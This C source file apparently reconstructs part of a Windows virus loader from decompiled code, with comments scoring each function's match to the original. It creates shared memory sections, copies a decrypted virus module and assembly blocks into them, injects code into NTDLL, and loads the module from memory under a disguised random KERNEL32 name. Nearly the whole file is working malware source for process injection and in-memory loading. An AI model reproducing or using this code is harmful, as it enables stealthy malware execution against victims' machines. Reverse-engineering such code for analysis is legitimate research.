/******************************************************************************************
  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "6. MemorySections.h"
#include "4. Encoding.h"
#include "5. Utils.h"
#include "7. AssemblyBlock0.h"
#include "8. AssemblyBlock1.h"
#include "9. AssemblyBlock2.h"
#include "A. EncodingAlgorithms.h"
#include "C. CodeBlock.h"

#include "config.h"
#include "define.h"

// Create the shared section, copy the content
// of pUnknownSegment and the decrypted module

// 95% (C) CODE MATCH
INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVOID pVirusModule, INT32 pVirusModuleSize, INT32 iExecEntryNumber, PVOID pUnknownSegment, DWORD pUnknownSegmentSize, PVOID *ppModuleBlock)
{
	HANDLE hMapHandle; // [sp+4h] [bp-28h]@1
	PVOID pVirusImageBase; // [sp+8h] [bp-24h]@3
	PIMAGE_NT_HEADERS pImageNT; // [sp+Ch] [bp-20h]@6
	INT32 iSectionPointer; // [sp+10h] [bp-1Ch]@1
	PVOID pLocalReg; // [sp+14h] [bp-18h]@1
	PIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-14h]@3
	UINT32 iSectionsSize; // [sp+1Ch] [bp-10h]@1
	PVOID pRemoteReg; // [sp+20h] [bp-Ch]@1
	PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader; // [sp+24h] [bp-8h]@3
	INT32 nRet; // [sp+28h] [bp-4h]@1

	pLocalReg       = 0;
	pRemoteReg      = 0;
	
	iSectionPointer = 0;
	iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;
	
	// Here we create a shared MapOfView between the current process and the HANDLE at hHandle
	nRet = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pLocalReg, &pRemoteReg);
	HAS_FAILED(nRet, nRet)
	
	// First part of the section dedicated to the VIRUS_MODULE_BLOCKS_HEADER
	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pLocalReg;
	pLocalReg                = (LPVOID)((DWORD)pLocalReg + sizeof(VIRUS_MODULE_BLOCKS_HEADER));
	iSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);
	
	// Copy the content of pUnknownSegment into the shared section
	CopySegmentIntoSections(&pLocalReg, pRemoteReg, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
	pVirusImageBase = pLocalReg;
	
	// Copy the decrypted module into into the shared section
	CopySegmentIntoSections(&pLocalReg, pRemoteReg, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
	pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;
	
	// Check the memory copied (len >= 0x1000), MZ header etc.
	if((UINT32)pVirusModuleSize >= 0x1000 &&
	   pImageDOS->e_magic == MZ_HEADER &&
	   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section ".text"
	{
		// Check the "Delay Import Directory Size" and change it, not sure why
		pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);
		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
			pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size
	}
	
	// Copy the sInfoBlock
	__memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));
	
	// Copy the entrypoint of the module
	sVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;
	sVirusModuleBlocksHeader->VirusModulePointer        = 0;
	
	// Copy the pointer to the module block (section) just created
	*ppModuleBlock = pRemoteReg;
	
	// Close all and return
	_F(UnmapViewOfFile)(sVirusModuleBlocksHeader);
	_F(ZwClose)(hMapHandle);

	return 0;
}

// 96% (C) CODE MATCH
INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader, PGENERAL_INFO_BLOCK sInfoBlock)
{
	HMODULE pVirusModule; // [sp+0h] [bp-90h]@5
	HANDLE hMappedAddress; // [sp+4h] [bp-8Ch]@7
	INT32 iResult; // [sp+8h] [bp-88h]@1
	PHARDCODED_ADDRESSES pHardAddrs; // [sp+Ch] [bp-84h]@1
	GENERAL_INFO_BLOCK sInfoBlockCopy; // [sp+10h] [bp-80h]@1

	__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK)); // Copy the information
	
	sInfoBlockCopy.OriginalAddress ^= X_PTR_KEY; // Get the original address of the variable sInfoBlock
	sInfoBlockCopy.UnknownZero0     = 0;
	
	// Point to the first block of assembly in the section
	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
	if(iResult) return iResult;
	
	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs)) return -4;
	
	/* Load library from the memory */
	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
	if(!pVirusModule) return -9;
	
	sVirusModuleBlocksHeader->VirusModulePointer = pVirusModule;
	hMappedAddress = sInfoBlockCopy.MappedAddress;
	
	if(sInfoBlockCopy.MappedAddress)
	{
		sInfoBlockCopy.MappedAddress = 0;
		pHardAddrs->ZwClose(hMappedAddress);
	}
	
	return 0;
}

// 100% (C) CODE MATCH
DWORD GetCodeBlockSize(void)
{
	return _SIZE(BLOCK4_END, BLOCK4_InjectAndExecuteVirus);
}

// 100% (C) CODE MATCH
DWORD GetCodeBlock(void)
{
	return (DWORD)BLOCK4_InjectAndExecuteVirus;
}

// 100% (C) CODE MATCH
DWORD GetRelativeExecuteLibraryPointer(void)
{
	return _SIZE(BLOCK4_ExecuteLibrary, BLOCK4_InjectAndExecuteVirus);
}

// 100% (C) CODE MATCH
UINT32 GetRelativeAlignAddressesPointer(void)
{
	return _SIZE(BLOCK4_AlignAddresses, BLOCK4_InjectAndExecuteVirus);
}

// 85% (C) CODE MATCH -> NEED DEBUG
INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *ppCodeBlock, PVOID *ppASMBlock)
{
	PVOID pCodeBlock; // eax@3
	HANDLE hMapHandle; // [sp+8h] [bp-28h]@1
	INT32 iASMBlock1Pointer; // [sp+Ch] [bp-24h]@3
	DWORD *v9; // [sp+10h] [bp-20h]@3
	INT32 iSectionPointer; // [sp+14h] [bp-1Ch]@1
	PVOID pLocal; // [sp+18h] [bp-18h]@1
	UINT32 iSectionsSize; // [sp+1Ch] [bp-14h]@1
	PVOID pRemote; // [sp+20h] [bp-10h]@1
	PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader; // [sp+24h] [bp-Ch]@3
	UINT32 iCodeBlockSize; // [sp+28h] [bp-8h]@1
	INT32 nRet; // [sp+2Ch] [bp-4h]@1

	pLocal = 0;
	pRemote = 0;
	
	iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)
	iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0) + _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0) + iCodeBlockSize;
	
	iSectionPointer = 0;
	
	// Create the shared section
	nRet = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pLocal, &pRemote);
	HAS_FAILED(nRet, nRet)
	
	// First part of the section dedicated to the ASM_CODE_BLOCKS_HEADER
	sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pLocal;
	pLocal               = (LPVOID)((DWORD)pLocal + sizeof(ASM_CODE_BLOCKS_HEADER));
	iSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);
	
	// Copy the 1st block of ASM code into the shared section
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0));
	iASMBlock1Pointer = iSectionPointer;
	
	// Copy the 2nd block of ASM code into the shared section
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0));
	pCodeBlock = (PVOID)GetCodeBlock();
	
	// Copy the 3st block of ASM code into the shared section
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);
	
	// Copy the address of __ASM_REF_3 in the __ASM_BLOCK0_1
	v9 = (DWORD *)((DWORD)sASMCodeBlocksHeader + iASMBlock1Pointer + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
	*v9 = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);
	
	// Put function address into the memory map
	sASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();
	sASMCodeBlocksHeader->AlignAddresses = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeAlignAddressesPointer();
	sASMCodeBlocksHeader->VirusModuleSection = (DWORD)pVirusModuleSection;
	
	// Put the values in the pointers
	*ppCodeBlock	= (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
	*ppASMBlock		= pRemote;
	
	// Close all and return
	_F(UnmapViewOfFile)(sASMCodeBlocksHeader);
	_F(ZwClose)(hMapHandle);
	
	return 0;
}

static BOOL bSetupMode = TRUE;

static PVOID s_ASMCodeBlocksPTR = NULL;
static PVOID s_virusBlocksPTR   = NULL;
static PVOID s_codeBlockPTR     = NULL;

// 98% (C) CODE MATCH
INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, DWORD iVirusModuleSize, HMODULE *hVirusModule)
{
	INT32 nRet;
	GENERAL_INFO_BLOCK sInfoBlock;

	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0)
		return 0;
	
	// Decrypt the Kernel32's and NTDLL's function names
	if(bSetupMode && DecodeEncryptedModuleNames() == FALSE)
		return -12;
	
	// Create the shared section and copy the data
	nRet = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
	HAS_FAILED(nRet, nRet)
	
	// If it is still in setup mode load the code
	if(bSetupMode)
	{
		// Create the shared section and copy the code
		nRet = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
		HAS_FAILED(nRet, nRet)
		
		bSetupMode = FALSE;
	}
	
	// Unknown
	nRet = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);
	if(!nRet)
		*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
	
	_F(UnmapViewOfFile)(s_virusBlocksPTR);
	
	return nRet;
}